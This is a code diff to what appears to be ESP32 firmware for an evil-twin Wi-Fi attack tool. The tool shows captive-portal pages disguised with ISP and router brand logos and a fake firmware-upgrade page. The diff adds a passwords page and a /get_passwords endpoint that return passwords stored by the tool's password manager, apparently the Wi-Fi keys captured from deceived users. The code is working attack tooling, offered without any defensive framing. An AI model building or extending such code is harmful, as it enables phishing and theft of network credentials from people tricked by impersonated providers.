@@ -22,8 +22,7 @@
 #include "evil_twin.h"
 #include "passwordMng.h"
 
-#include "web/web_net_manager.h"
-
+/* Logos include */
 #include "web/logo/vodafone.h"
 #include "web/logo/fastweb.h"
 #include "web/logo/skywifi.h"
@@ -33,7 +32,9 @@
 #include "web/logo/huawei.h"
 #include "web/logo/netis.h"
 #include "web/logo/generic.h"
+/* Pages include */
 #include "web/loader.h"
+#include "web/passwords.h"
 #include "web/firmware_upgrade/index.h"
 
 #define CHUNK_SIZE 512
@@ -199,6 +200,19 @@ static esp_err_t save_password_manager(httpd_req_t *req)
 
 
 /**
+ * @brief Handle get_password POST request and return the saved password from SPIFFS 
+ * 
+ * @param req 
+ * @return esp_err_t 
+ */
+static esp_err_t get_password_handler(httpd_req_t *req) 
+{
+    password_manager_read_passwords(req);
+    return ESP_OK;
+}
+
+
+/**
  * @brief All request all redirected here
  * 
  * @param req 
@@ -227,6 +241,11 @@ static void captive_portal_redirect(httpd_req_t *req)
 				break;
 		}
 		return;
+	}
+	/* passwords.html */
+	else if( strcmp(req->uri, "/passwords.html") == 0 )
+	{
+		httpd_send_chunked_data(req, password_page, sizeof(password_page), NULL);
 	}
 	/* loader.html same for all */
 	else if( strcmp(req->uri, "/loader.html") == 0 )
@@ -334,6 +353,14 @@ void http_attack_server_start(target_info_t *_target_info)
             .user_ctx = NULL
         };
         httpd_register_uri_handler(server, &update_uri);
+
+		httpd_uri_t get_password_uri = {
+            .uri = "/get_passwords",
+            .method = HTTP_POST,
+            .handler = get_password_handler,
+            .user_ctx = NULL
+        };
+        httpd_register_uri_handler(server, &get_password_uri);
     }
 	else
 	{
